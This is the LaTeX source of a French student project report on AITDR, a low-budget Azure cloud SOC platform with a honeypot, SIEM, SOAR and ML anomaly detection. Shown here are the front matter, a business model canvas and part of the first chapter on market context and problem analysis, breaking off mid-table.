\documentclass[11pt,a4paper]{report}

% ============================================
% CONFIGURATION GÉNÉRALE
% ============================================
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage[margin=2.5cm, top=3cm, bottom=3cm]{geometry}
\usepackage{microtype}
\usepackage{parskip}
\usepackage{pdflscape}
\usepackage{adjustbox}
\usepackage{csquotes}
\usepackage{xurl}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{array}
\usepackage{longtable}
\usepackage{tabularx}
\usepackage{booktabs}
\usepackage{colortbl}
\usepackage{float}
\usepackage{caption}
\usepackage[colorlinks=true, linkcolor=titleblue, urlcolor=titleblue, citecolor=titleblue]{hyperref}
\usepackage{bookmark}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{tikz}
\usetikzlibrary{positioning}
\usepackage{listings}
\usepackage{mdframed}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{lastpage}

\hypersetup{
  pdftitle={AITDR - Azure Intelligent Threat Detection and Response},
  pdfauthor={Oussama Gammal},
  pdfsubject={Rapport de Projet de Fin d'Annee},
  pdfkeywords={SOC, Azure, SIEM, SOAR, Machine Learning, Cybersecurite, Terraform, Honeypot},
  pdfcreator={LaTeX}
}
\urlstyle{same}
\emergencystretch=2em
\clubpenalty=10000
\widowpenalty=10000
\displaywidowpenalty=10000

% ============================================
% COULEURS
% ============================================
\definecolor{titleblue}{RGB}{20,60,120}
\definecolor{tabheader}{RGB}{20,60,120}
\definecolor{tabrowlight}{RGB}{248,250,252}
\definecolor{tabrowdark}{RGB}{235,240,245}
\definecolor{codegray}{RGB}{245,245,245}
\definecolor{codeframe}{RGB}{210,220,230}
\definecolor{codeblue}{RGB}{30,100,180}
\definecolor{codegreen}{RGB}{0,128,0}
\definecolor{codeorange}{RGB}{200,80,0}
\definecolor{infobox}{RGB}{230,240,255}
\definecolor{alertred}{RGB}{180,30,30}
\definecolor{successbox}{RGB}{230,255,230}

% Couleurs BMC
\definecolor{cPartners}{RGB}{226,232,240}
\definecolor{cActivities}{RGB}{207,226,243}
\definecolor{cResources}{RGB}{207,226,243}
\definecolor{cValue}{RGB}{255,224,178}
\definecolor{cRelations}{RGB}{215,238,213}
\definecolor{cChannels}{RGB}{215,238,213}
\definecolor{cSegments}{RGB}{232,213,242}
\definecolor{cCosts}{RGB}{230,230,230}
\definecolor{cRevenue}{RGB}{230,230,230}

% ============================================
% TABLEAUX
% ============================================
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}
\newcolumntype{R}[1]{>{\raggedleft\arraybackslash}p{#1}}
\newcolumntype{Y}{>{\raggedright\arraybackslash}X}
\newcommand{\theadcell}[1]{\cellcolor{tabheader}\textcolor{white}{\bfseries #1}}
\newcommand{\rowlight}{\rowcolor{tabrowlight}}
\newcommand{\rowdark}{\rowcolor{tabrowdark}}
\renewcommand{\arraystretch}{1.28}
\setlength{\tabcolsep}{4pt}

% ============================================
% CODE
% ============================================
\lstdefinestyle{commoncode}{
  backgroundcolor=\color{codegray},
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  breakatwhitespace=false,
  postbreak=\mbox{\textcolor{gray}{$\hookrightarrow$}\space},
  captionpos=b,
  frame=single,
  rulecolor=\color{codeframe},
  framerule=0.6pt,
  xleftmargin=0.4em,
  xrightmargin=0.4em,
  framexleftmargin=0.4em,
  framexrightmargin=0.4em,
  numbers=left,
  numberstyle=\tiny\color{gray},
  numbersep=8pt,
  showstringspaces=false,
  tabsize=2,
  columns=fullflexible,
  keepspaces=true
}
\lstdefinestyle{bashstyle}{style=commoncode, language=bash, commentstyle=\color{codegreen}, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
\lstdefinestyle{pythonstyle}{style=commoncode, language=Python, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
\lstdefinestyle{hclstyle}{style=commoncode, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
\lstdefinestyle{sqlstyle}{style=commoncode, language=SQL, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}

% ============================================
% BOÎTES ET FIGURES PLACEHOLDER
% ============================================
\newmdenv[
  backgroundcolor=infobox,
  linecolor=titleblue,
  linewidth=1.2pt,
  leftline=true, rightline=false, topline=false, bottomline=false,
  innerleftmargin=12pt, innerrightmargin=8pt,
  innertopmargin=6pt, innerbottommargin=6pt
]{infobox}

\newcommand{\placeholderfigure}[2]{%
\begin{figure}[H]
\centering
\fbox{\begin{minipage}{0.86\textwidth}
\centering
\vspace{0.8cm}
\textbf{[Insérer la Figure #1 ici]}
\vspace{0.8cm}
\end{minipage}}
\caption{#2}
\label{fig:#1}
\end{figure}
}

\newcommand{\manualplaceholderfigure}[2]{%
\begin{center}
\fbox{\begin{minipage}{0.86\textwidth}
\centering
\vspace{0.8cm}
\textbf{[Insérer la Figure #1 ici]}
\vspace{0.8cm}
\end{minipage}}
\end{center}
\addcontentsline{lof}{figure}{Figure #1 : #2}
}

\newcommand{\code}[1]{\texttt{\small #1}}

% ============================================
% MISE EN PAGE
% ============================================
\pagestyle{fancy}
\fancyhf{}
\rhead{\small\bfseries AITDR}
\lhead{\small \nouppercase{\leftmark}}
\cfoot{\small Page \thepage\ sur \pageref{LastPage}}
\setlength{\headheight}{13pt}
\renewcommand{\headrulewidth}{0.3pt}
\fancypagestyle{plain}{
  \fancyhf{}
  \cfoot{\small Page \thepage\ sur \pageref{LastPage}}
  \renewcommand{\headrulewidth}{0pt}
}
\titleformat{\chapter}[display]
  {\Large\bfseries\color{titleblue}}
  {\filright\MakeUppercase{\chaptertitlename}\ \thechapter}
  {0.4em}
  {\titlerule[0.6pt]\vspace{0.6em}\filright}
\titlespacing*{\chapter}{0pt}{8pt}{14pt}
\titleformat{\section}[block]{\large\bfseries}{\thesection}{0.6em}{}
\titlespacing*{\section}{0pt}{12pt}{5pt}
\titleformat{\subsection}[block]{\normalsize\bfseries}{\thesubsection}{0.5em}{}
\titlespacing*{\subsection}{0pt}{8pt}{3pt}
\setlist[itemize]{noitemsep, topsep=3pt, leftmargin=1.5em}
\setlist[enumerate]{noitemsep, topsep=3pt, leftmargin=1.5em}
\captionsetup{font=small, labelfont=bf}

% ============================================
% BUSINESS MODEL CANVAS
% ============================================
\newcommand{\bmctitle}[1]{{\bfseries\small\color{titleblue} #1}\\[2pt]}
\newcommand{\AITDRBusinessModelCanvas}{%
\clearpage
\begin{landscape}
\thispagestyle{empty}
\centering
\vspace*{-0.2cm}
\captionsetup{hypcap=false}
\captionof{figure}{Business Model Canvas de AITDR}
\label{fig:bmc}
\vspace{0.15cm}
\begingroup
\setlist[itemize]{leftmargin=*, itemsep=1pt, topsep=1pt, parsep=0pt, label=\textbullet}
\noindent\begin{adjustbox}{max width=0.98\linewidth, max totalheight=0.90\textheight, center}
\begin{tikzpicture}[font=\fontsize{7.4}{8.5}\selectfont]
\def\colA{4.1}\def\colB{4.1}\def\colC{5.3}\def\colD{4.1}\def\colE{4.1}
\def\rowTop{10.4}\def\rowHalf{5.2}\def\rowBottom{4.25}
\def\xA{0}
\pgfmathsetmacro{\xB}{\xA+\colA}
\pgfmathsetmacro{\xC}{\xB+\colB}
\pgfmathsetmacro{\xD}{\xC+\colC}
\pgfmathsetmacro{\xE}{\xD+\colD}
\pgfmathsetmacro{\xEnd}{\xE+\colE}
\def\yTop{0}
\pgfmathsetmacro{\yMid}{\yTop-\rowHalf}
\pgfmathsetmacro{\yBottomRowStart}{\yTop-\rowTop}
\pgfmathsetmacro{\yEnd}{\yBottomRowStart-\rowBottom}
\pgfmathsetmacro{\wA}{\colA-0.35}
\pgfmathsetmacro{\wB}{\colB-0.35}
\pgfmathsetmacro{\wC}{\colC-0.35}
\pgfmathsetmacro{\wD}{\colD-0.35}
\pgfmathsetmacro{\wE}{\colE-0.35}
\pgfmathsetmacro{\wHalf}{(\xEnd-\xA)/2-0.35}
\pgfmathsetmacro{\xMidBottom}{\xA+(\xEnd-\xA)/2}

\fill[cPartners] (\xA,\yTop) rectangle (\xB,\yBottomRowStart);
\draw (\xA,\yTop) rectangle (\xB,\yBottomRowStart);
\node[anchor=north west, text width=\wA cm, align=left, inner sep=5pt] at (\xA,\yTop) {
\bmctitle{Partenaires clés}
\begin{itemize}
  \item Microsoft Azure.
  \item Communautés open source : Suricata, DVWA, Sigma, MITRE ATT\&CK.
  \item Threat Intelligence : AbuseIPDB, Emerging Threats.
  \item EMSI et établissements d'enseignement.
  \item Revendeurs, MSSP, Microsoft Partner Network.
\end{itemize}};

\fill[cActivities] (\xB,\yTop) rectangle (\xC,\yMid);
\draw (\xB,\yTop) rectangle (\xC,\yMid);
\node[anchor=north west, text width=\wB cm, align=left, inner sep=5pt] at (\xB,\yTop) {
\bmctitle{Activités clés}
\begin{itemize}
  \item Développement Terraform, Python et Logic Apps.
  \item Calibration ML : Isolation Forest et DBSCAN.
  \item Mise à jour des règles KQL/Sigma.
  \item Support client et veille Threat Intelligence.
\end{itemize}};

\fill[cResources] (\xB,\yMid) rectangle (\xC,\yBottomRowStart);
\draw (\xB,\yMid) rectangle (\xC,\yBottomRowStart);
\node[anchor=north west, text width=\wB cm, align=left, inner sep=5pt] at (\xB,\yMid) {
\bmctitle{Ressources clés}
\begin{itemize}
  \item Infrastructure Azure : Sentinel, Logic Apps, SQL, Key Vault.
  \item Code Terraform modulaire.
  \item Jeux de logs collectés par honeypot.
  \item Compétences cloud, sécurité et data science.
\end{itemize}};

\fill[cValue] (\xC,\yTop) rectangle (\xD,\yBottomRowStart);
\draw (\xC,\yTop) rectangle (\xD,\yBottomRowStart);
\node[anchor=north west, text width=\wC cm, align=left, inner sep=5pt] at (\xC,\yTop) {
\bmctitle{Proposition de valeur}
\begin{itemize}
  \item Pour les entreprises : SOC cloud-native accessible, détection en temps réel, réponse automatisée et coût maîtrisé.
  \item Pour les MSSP : socle reproductible pour superviser plusieurs clients.
  \item MTTD réduit à moins de 5 minutes.
  \item Blocage automatique en moins de 30 secondes.
  \item Détection d'anomalies par Machine Learning.
  \item Déploiement reproductible via Terraform.
\end{itemize}};

\fill[cRelations] (\xD,\yTop) rectangle (\xE,\yMid);
\draw (\xD,\yTop) rectangle (\xE,\yMid);
\node[anchor=north west, text width=\wD cm, align=left, inner sep=5pt] at (\xD,\yTop) {
\bmctitle{Relation client}
\begin{itemize}
  \item Documentation self-service.
  \item Support communautaire.
  \item Onboarding assisté pour les offres SaaS.
  \item Formation et support Enterprise/MSSP.
\end{itemize}};

\fill[cChannels] (\xD,\yMid) rectangle (\xE,\yBottomRowStart);
\draw (\xD,\yMid) rectangle (\xE,\yBottomRowStart);
\node[anchor=north west, text width=\wD cm, align=left, inner sep=5pt] at (\xD,\yMid) {
\bmctitle{Canaux}
\begin{itemize}
  \item Dépôt GitHub.
  \item Portail SaaS.
  \item Azure Marketplace.
  \item LinkedIn, webinaires et conférences.
  \item Partenariats écoles.
\end{itemize}};

\fill[cSegments] (\xE,\yTop) rectangle (\xEnd,\yBottomRowStart);
\draw (\xE,\yTop) rectangle (\xEnd,\yBottomRowStart);
\node[anchor=north west, text width=\wE cm, align=left, inner sep=5pt] at (\xE,\yTop) {
\bmctitle{Segments clients}
\begin{itemize}
  \item PME et startups sans équipe SOC.
  \item Analystes SOC.
  \item Administrateurs Azure.
  \item Équipes DevSecOps.
  \item MSSP.
  \item Établissements d'enseignement.
\end{itemize}};

\fill[cCosts] (\xA,\yBottomRowStart) rectangle (\xMidBottom,\yEnd);
\draw (\xA,\yBottomRowStart) rectangle (\xMidBottom,\yEnd);
\node[anchor=north west, text width=\wHalf cm, align=left, inner sep=5pt] at (\xA,\yBottomRowStart) {
\bmctitle{Structure de coûts}
\begin{itemize}
  \item Infrastructure Azure : VMs B2s, Sentinel, SQL Database, stockage.
  \item Développement et maintenance.
  \item R\&D ML et règles de détection.
  \item Marketing, formation, documentation et support.
\end{itemize}};

\fill[cRevenue] (\xMidBottom,\yBottomRowStart) rectangle (\xEnd,\yEnd);
\draw (\xMidBottom,\yBottomRowStart) rectangle (\xEnd,\yEnd);
\node[anchor=north west, text width=\wHalf cm, align=left, inner sep=5pt] at (\xMidBottom,\yBottomRowStart) {
\bmctitle{Sources de revenus}
\begin{itemize}
  \item Freemium open source auto-hébergé.
  \item Abonnement SaaS : 49--99 USD/mois.
  \item Licence Enterprise sur devis.
  \item Formation, certification et consulting.
\end{itemize}};
\end{tikzpicture}
\end{adjustbox}
\endgroup
\end{landscape}
\clearpage}

\begin{document}

% ============================================
% 1. PAGE DE GARDE
% ============================================
\begin{titlepage}
\thispagestyle{empty}
\centering
\vspace*{0.8cm}
{\Large\bfseries EMSI --- École Marocaine des Sciences de l'Ingénieur}\\[0.2cm]
{\normalsize Filière : Ingénierie Informatique \& Réseaux (4IIR)}\\[1.2cm]

{\color{titleblue}\rule{\textwidth}{1.8pt}}\\[0.75cm]
{\Huge\bfseries\color{titleblue} AITDR}\\[0.35cm]
{\Large\bfseries Azure Intelligent Threat Detection \& Response}\\[0.45cm]
{\large Plateforme SOC Cloud --- Détection Intelligente et Réponse Automatisée aux Cybermenaces}\\[0.75cm]
{\color{titleblue}\rule{0.72\textwidth}{0.7pt}}\\[1.0cm]

{\Large\bfseries Rapport de Projet de Fin d'Année}\\[0.35cm]
{\large\bfseries Promotion 2025 --- 2026}\\[1.5cm]

\begin{mdframed}[
  backgroundcolor=infobox,
  linecolor=titleblue,
  linewidth=0.8pt,
  roundcorner=4pt,
  innerleftmargin=18pt,
  innerrightmargin=18pt,
  innertopmargin=12pt,
  innerbottommargin=12pt
]
\renewcommand{\arraystretch}{1.25}
\begin{tabularx}{0.82\textwidth}{@{}L{3.5cm}Y@{}}
\textbf{Auteur} & Oussama Gammal \\
\textbf{Encadrant} & [Nom du superviseur] \\
\textbf{Établissement} & EMSI --- École Marocaine des Sciences de l'Ingénieur \\
\textbf{Filière} & Ingénierie Informatique \& Réseaux (4IIR) \\
\textbf{Date} & 16 juin 2026 \\
\textbf{Version} & Version 1.0 --- Final \\
\textbf{Budget} & Budget : 100 USD \\
\end{tabularx}
\end{mdframed}
\vfill
{\color{titleblue}\rule{\textwidth}{0.5pt}}\\[0.25cm]
{\small Rapport confidentiel --- Usage académique uniquement}
\end{titlepage}

% ============================================
% 2. DÉDICACES
% ============================================
\chapter*{Dédicaces}
\addcontentsline{toc}{chapter}{Dédicaces}

À mes parents, pour leur soutien indéfectible, leur patience et leurs encouragements constants tout au long de mon parcours académique. Leur confiance et leurs sacrifices ont constitué une source permanente de motivation.

À mes encadrants, pour leurs précieux conseils, leur disponibilité, leur rigueur scientifique et leur accompagnement durant les différentes étapes de ce projet de fin d'année.

À mes camarades de promotion, pour leur esprit d'équipe, leur entraide, leurs échanges constructifs et les moments partagés durant ces années de formation.

À toutes les personnes qui ont contribué, de près ou de loin, à la réalisation de ce travail, je dédie ce rapport avec reconnaissance et respect.

\begin{flushright}
\textit{Oussama Gammal}
\end{flushright}

% ============================================
% 3. REMERCIEMENTS
% ============================================
\chapter*{Remerciements}
\addcontentsline{toc}{chapter}{Remerciements}

Je tiens à exprimer ma profonde gratitude à mes encadrants pédagogiques pour leur accompagnement, leurs orientations et leurs remarques constructives. Leur suivi a permis de cadrer ce projet et d'en assurer la progression méthodique.

Je remercie également l'\textbf{EMSI --- École Marocaine des Sciences de l'Ingénieur}, ainsi que l'ensemble de l'équipe pédagogique de la filière \textbf{Ingénierie Informatique \& Réseaux}, pour la qualité de la formation dispensée et pour l'environnement d'apprentissage offert.

Mes remerciements s'adressent aussi aux partenaires technologiques, notamment \textbf{Microsoft}, dont l'écosystème Azure et les crédits étudiants ont rendu possible l'expérimentation de la solution dans un contexte budgétaire contraint.

Enfin, je remercie mes camarades de l'équipe projet et de promotion pour leur soutien moral, leurs échanges techniques et leur esprit de collaboration tout au long de cette expérience.

% ============================================
% 4. RÉSUMÉ
% ============================================
\chapter*{Résumé}
\addcontentsline{toc}{chapter}{Résumé}

Le projet \textbf{AITDR - Azure Intelligent Threat Detection \& Response} consiste à concevoir et déployer une plateforme SOC Cloud destinée à détecter et répondre automatiquement aux cybermenaces. Il s'inscrit dans un contexte où la transformation numérique des organisations marocaines s'accélère, tandis que les attaques automatisées augmentent en fréquence et en complexité. Les solutions SIEM traditionnelles demeurent souvent coûteuses et difficiles à exploiter pour les PME, ce qui crée un besoin fort pour une solution accessible, reproductible et automatisée.

AITDR repose sur une architecture Azure sécurisée de type Hub-and-Spoke, un honeypot DVWA exposé pour la capture d'attaques réelles, un pipeline ETL de collecte et de parsing des logs, Microsoft Sentinel pour la corrélation SIEM, Azure Logic Apps pour la réponse SOAR, ainsi que des modèles de Machine Learning non supervisés pour la détection d'anomalies. L'infrastructure est déployée avec Terraform afin de garantir la reproductibilité et la traçabilité des ressources.

Les résultats obtenus démontrent la faisabilité technique et budgétaire du projet. Le prototype respecte la contrainte de 100 USD et permet de réduire les délais de détection et de réponse grâce à l'automatisation. La solution présente ainsi une valeur opérationnelle pour les organisations disposant de moyens limités, tout en constituant une base évolutive pour des usages professionnels.

\textbf{Mots-clés :} SOC, Azure, SIEM, SOAR, Machine Learning, Cybersécurité, Infrastructure as Code, Terraform, Honeypot.

% ============================================
% 5. SOMMAIRE
% ============================================
\tableofcontents

% ============================================
% 6. LISTE DES FIGURES
% ============================================
\listoffigures

% ============================================
% 7. LISTE DES TABLEAUX
% ============================================
\listoftables

% ============================================
% 8. LISTE DES ABRÉVIATIONS ET ACRONYMES
% ============================================
\chapter*{Liste des abréviations et acronymes}
\addcontentsline{toc}{chapter}{Liste des abréviations et acronymes}
\begin{longtable}{|L{3.5cm}|L{11cm}|}
\caption{Liste des abréviations et acronymes}\\
\hline
\theadcell{Abréviation} & \theadcell{Signification} \\
\hline
\endfirsthead
\hline
\theadcell{Abréviation} & \theadcell{Signification} \\
\hline
\endhead
AMA & Azure Monitor Agent \\ \hline
ANRT & Agence Nationale de Réglementation des Télécommunications \\ \hline
APT & Advanced Persistent Threat \\ \hline
ARM & Azure Resource Manager \\ \hline
BMC & Business Model Canvas \\ \hline
CAGR & Compound Annual Growth Rate \\ \hline
CA & Chiffre d'Affaires \\ \hline
CF & Charges Fixes \\ \hline
CMI & Centre Monétique Interbancaire \\ \hline
CNDP & Commission Nationale de Contrôle de la Protection des Données Personnelles \\ \hline
CNOMP & Conseil National de l'Ordre des Médecins du Maroc \\ \hline
CVu & Coût Variable unitaire \\ \hline
DCR & Data Collection Rule \\ \hline
DDL & Data Definition Language \\ \hline
DMZ & Demilitarized Zone \\ \hline
DVWA & Damn Vulnerable Web Application \\ \hline
ETL & Extract, Transform, Load \\ \hline
FQDN & Fully Qualified Domain Name \\ \hline
HCL & HashiCorp Configuration Language \\ \hline
IaC & Infrastructure as Code \\ \hline
IDS & Intrusion Detection System \\ \hline
IPS & Intrusion Prevention System \\ \hline
KQL & Kusto Query Language \\ \hline
MAD & Moroccan Dirham \\ \hline
MENA & Middle East and North Africa \\ \hline
ML & Machine Learning \\ \hline
MTTD & Mean Time To Detect \\ \hline
MTTC & Mean Time To Contain \\ \hline
MVP & Minimum Viable Product \\ \hline
NSG & Network Security Group \\ \hline
PAYG & Pay-As-You-Go \\ \hline
PESTEL & Politique, Économique, Social, Technologique, Environnemental, Légal \\ \hline
PFA & Projet de Fin d'Année \\ \hline
RBAC & Role-Based Access Control \\ \hline
RGPD & Règlement Général sur la Protection des Données \\ \hline
SaaS & Software as a Service \\ \hline
SAM & Serviceable Addressable Market \\ \hline
SIEM & Security Information and Event Management \\ \hline
SLA & Service Level Agreement \\ \hline
SOAR & Security Orchestration, Automation and Response \\ \hline
SOC & Security Operations Center \\ \hline
SQL & Structured Query Language \\ \hline
SSH & Secure Shell \\ \hline
STP & Segmentation, Targeting, Positioning \\ \hline
SWOT & Strengths, Weaknesses, Opportunities, Threats \\ \hline
TAM & Total Addressable Market \\ \hline
TLS & Transport Layer Security \\ \hline
VNet & Virtual Network \\ \hline
VPN & Virtual Private Network \\ \hline
\end{longtable}

% ============================================
% 9. INTRODUCTION GÉNÉRALE
% ============================================
\chapter*{Introduction générale}
\addcontentsline{toc}{chapter}{Introduction générale}

La transformation numérique des organisations marocaines s'accélère sous l'effet de la modernisation des services, de l'adoption du Cloud et de la généralisation des usages numériques. Cette évolution offre de nouvelles opportunités d'innovation, mais elle augmente également la surface d'exposition aux cybermenaces. Les attaques automatisées, les scans massifs, les ransomwares et les tentatives d'intrusion ciblant les services exposés deviennent plus fréquents. Dans ce contexte, les solutions SIEM traditionnelles restent souvent coûteuses, complexes à déployer et difficiles à exploiter pour les organisations disposant de budgets limités.

La problématique centrale du projet est la suivante : \textit{Comment concevoir et déployer une plateforme SOC cloud-native, automatisée et intelligente sur Microsoft Azure, permettant aux organisations de détecter et de répondre aux cybermenaces en temps réel, tout en maîtrisant les coûts d'infrastructure dans un budget contraint de 100 USD ?}

Les objectifs du projet sont : concevoir une infrastructure Azure sécurisée, capturer des attaques via un honeypot, automatiser la collecte des logs, centraliser les événements dans Microsoft Sentinel, automatiser la réponse via Azure Logic Apps, détecter les anomalies par Machine Learning, visualiser les menaces avec Power BI et respecter le budget de 100 USD.

Le rapport est organisé autour des chapitres suivants : présentation du cadre de projet, analyse stratégique et étude de marché, viabilité entrepreneuriale et modèle d'affaires, planification et management de projet, conception de la solution, réalisation technique, puis conclusion générale avec bibliographie et annexes.

% ============================================
% CHAPITRE 1
% ============================================
\chapter{Présentation du cadre de projet (CONTEXTE : exploration du problème et opportunité)}

\section{Contexte général et constat terrain}
\subsection{La cybersécurité au Maroc : une réalité préoccupante}
La cybersécurité au Maroc connaît une montée en importance en raison de la digitalisation accélérée de l'économie. Les entreprises, administrations et établissements publics utilisent de plus en plus des services numériques et cloud, ce qui augmente leur exposition aux attaques. Les statistiques retenues dans ce projet indiquent que 70\% des entreprises marocaines ont subi au moins une cyberattaque significative, que 45\% ont été touchées par des ransomwares et que le coût moyen d'une attaque peut atteindre 120 000 MAD. En parallèle, seuls 15\% des organisations disposent d'un SOC et 10\% d'un SIEM, ce qui traduit un écart notable entre le niveau de menace et le niveau de protection.

\subsection{L'essor du Cloud comme levier d'innovation}
L'adoption massive des plateformes cloud telles que Microsoft Azure, AWS et Google Cloud constitue un levier d'innovation pour les organisations marocaines. Le Cloud offre la scalabilité, la facturation à l'usage, la disponibilité de services managés et l'accès rapide à des technologies avancées. En cybersécurité, il permet de déployer des composants SIEM, SOAR, stockage, supervision et Machine Learning sans investir dans une infrastructure matérielle lourde.

\section{Identification et formulation du problème}
\subsection{Cartographie des frustrations}
\begin{table}[H]
\centering
\caption{Cartographie des frustrations par segment}
\label{tab:frustrations}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|Y|Y|}
\hline
\theadcell{Catégorie} & \theadcell{Frustrations identifiées} & \theadcell{Verbatim représentatif} \\
\hline
Responsable Sécurité & Coût élevé des SIEM, manque de visibilité, difficulté à justifier l'investissement. & « Les solutions que nous avons évaluées coûtent plus de 20 000 MAD par mois. » \\ \hline
Analyste SOC & Surcharge d'alertes, faux positifs, outils peu intégrés. & « Je passe 80\% de mon temps à trier des faux positifs. » \\ \hline
Développeur DevOps & Sécurité ajoutée tardivement, absence d'intégration CI/CD. & « La sécurité arrive souvent en fin de cycle. » \\ \hline
Direction Générale & Risque réputationnel, conformité, coût incertain. & « Nous voulons être protégés sans exploser le budget. » \\ \hline
\end{tabularx}
\end{table}
\placeholderfigure{1.1}{Extraits d'entretiens avec les professionnels de la sécurité}

\subsection{Formulation structurée du problème}
Les organisations marocaines, notamment les PME, sont confrontées à des cybermenaces croissantes, mais ne disposent pas toujours de solutions SOC accessibles, intégrées et automatisées. Le problème central réside dans la difficulté de mettre en place une capacité de détection et de réponse efficace tout en respectant des contraintes budgétaires sévères.

\subsection{Analyse des causes profondes : méthode des 5 Pourquoi}
\begin{table}[H]
\centering
\caption{Analyse des 5 Pourquoi}
\label{tab:5pourquoi}
\small
\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|Y|}
\hline
\theadcell{Niveau} & \theadcell{Question/Constat} & \theadcell{Réponse/Cause identifiée} \\
\hline
P1 & Pourquoi les organisations n'ont-elles pas de SOC efficace ? & Les solutions existantes sont coûteuses et complexes. \\ \hline
P2 & Pourquoi sont-elles coûteuses ? & Elles reposent sur des licences, infrastructures et équipes spécialisées. \\ \hline
P3 & Pourquoi ce modèle est-il inadapté aux PME ? & Les éditeurs ciblent surtout les grands comptes. \\ \hline
P4 & Pourquoi les alternatives open source restent limitées ? & Elles nécessitent une expertise technique rare. \\ \hline
P5 & Pourquoi l'expertise est-elle rare ? & Les profils cyber sont encore insuffisants face à la demande. \\ \hline
\end{tabularx}
\end{table}

\section{Compréhension approfondie de l'utilisateur}
\subsection{Profils utilisateurs cibles --- méthode QQOQCCP}
\begin{table}[H]
\centering
\caption{Profils QQOQCCP des utilisateurs}
\label{tab:qqoqccp}
\scriptsize
\begin{tabularx}{\textwidth}{|L{2.2cm}|Y|Y|}
\hline
\theadcell{Dimension} & \theadcell{Responsable de Sécurité / RSSI} & \theadcell{Analyste SOC} \\
\hline
QUI ? & Responsable sécurité d'une PME/ETI marocaine. & Jeune analyste cybersécurité en centre SOC. \\ \hline
QUOI ? & Besoin de visibilité, reporting et détection. & Besoin d'outils de corrélation et réponse rapide. \\ \hline
OÙ ? & Casablanca, infrastructures cloud et sites distants. & SOC d'entreprise ou MSSP. \\ \hline
QUAND ? & En continu, surtout audits et migrations cloud. & En continu, lors des alertes et investigations. \\ \hline
COMMENT ? & Outils basiques ou audits ponctuels. & SIEM traditionnel, tickets et tableaux de bord. \\ \hline
COMBIEN ? & Budget sécurité limité. & Temps important consacré aux faux positifs. \\ \hline
POURQUOI ? & Réduire le risque et répondre à la conformité. & Protéger l'entreprise et réduire la charge opérationnelle. \\ \hline
\end{tabularx}
\end{table}

\section{Génération et sélection de la solution}
\subsection{Exploration des pistes de solution}
\begin{table}[H]
\centering
\caption{Matrice d'impact/faisabilité des pistes de solution}
\label{tab:pistes}
\small
\begin{tabularx}{\textwidth}{|L{3.2cm}|Y|L{2cm}|L{2cm}|L{2cm}|}
\hline
\theadcell{Piste} & \theadcell{Description} & \theadcell{Impact} & \theadcell{Faisabilité} & \theadcell{Score global} \\
\hline
SIEM open source & Déploiement Wazuh/Elastic. & Élevé & Moyenne & 7/10 \\ \hline
Solution commerciale & Sentinel/Splunk clé en main. & Élevé & Élevée & 6/10 \\ \hline
AITDR cloud-native & SOC intégré sur Azure. & Très élevé & Élevée & 9/10 \\ \hline
Externalisation SOC & Recours à un MSSP. & Élevé & Moyenne & 6/10 \\ \hline
Hybride open source + cloud & Combinaison de briques diverses. & Élevé & Moyenne & 7/10 \\ \hline
\end{tabularx}
\end{table}

\subsection{Solution retenue et justification}
AITDR est une plateforme SOC cloud-native qui combine capture d'attaques, collecte de logs, SIEM, SOAR, Machine Learning et visualisation. La solution est retenue pour quatre raisons : maîtrise des coûts via Azure PAYG, intégration native avec l'écosystème Microsoft, reproductibilité par Terraform et innovation grâce au Machine Learning non supervisé.

\section{Hypothèses de départ}
\begin{table}[H]
\centering
\caption{Hypothèses de départ}
\label{tab:hypotheses}
\small
\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|L{2.8cm}|Y|}
\hline
\theadcell{ID} & \theadcell{Hypothèse} & \theadcell{Nature} & \theadcell{Moyen de vérification} \\
\hline
H1 & Les organisations marocaines ont besoin de SOC accessibles. & Stratégique & Entretiens, enquête et statistiques. \\ \hline
H2 & Une solution cloud-native réduit les coûts. & Technique & Simulation budgétaire et prototype. \\ \hline
H3 & Le SOAR réduit le temps de réponse. & Opérationnelle & Tests d'incidents et métriques MTTC. \\ \hline
\end{tabularx}
\end{table}

\section{Validation terrain du besoin}
\subsection{Méthodologie de collecte}
La validation repose sur une phase quantitative, à travers une enquête en ligne auprès de responsables IT et RSSI, et une phase qualitative, à travers des entretiens semi-directifs avec des professionnels de la sécurité.

\subsection{Résultats quantitatifs et analyse}
\begin{table}[H]
\centering
\caption{Résultats des indicateurs clés}
\label{tab:indicateurs}
\small
\begin{tabularx}{\textwidth}{|Y|L{3cm}|Y|}
\hline
\theadcell{Indicateur} & \theadcell{Résultat} & \theadcell{Analyse} \\
\hline
Taux de réponse & 64\% & Participation représentative. \\ \hline
Insatisfaction outils actuels & 72\% & Forte demande d'alternative. \\ \hline
Budget sécurité moyen & 120 000 MAD/an & Ressources limitées. \\ \hline
Intérêt solution Azure-native & 85\% & Bonne adéquation technologique. \\ \hline
\end{tabularx}
\end{table}

\subsection{Extraits d'entretiens qualitatifs}
\begin{itemize}
  \item \textbf{RSSI, secteur bancaire :} « Microsoft Sentinel nous intéresse, mais nous n'avons pas les compétences internes pour le configurer correctement. »
  \item \textbf{Analyste SOC :} « Notre SIEM génère trop d'alertes, dont la majorité sont des faux positifs. »
  \item \textbf{Responsable IT PME :} « Nous avons besoin d'une solution de cybersécurité réaliste par rapport à notre budget. »
\end{itemize}

\subsection{Décision : GO}
\begin{table}[H]
\centering
\caption{Matrice de décision GO/PIVOT}
\label{tab:decision}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|L{3cm}|L{3cm}|Y|}
\hline
\theadcell{Critère} & \theadcell{Seuil requis} & \theadcell{Résultat} & \theadcell{Verdict} \\
\hline
Besoin marché & Insatisfaction $>$ 50\% & 72\% & GO \\ \hline
Faisabilité technique & Prototype déployable & Oui & GO \\ \hline
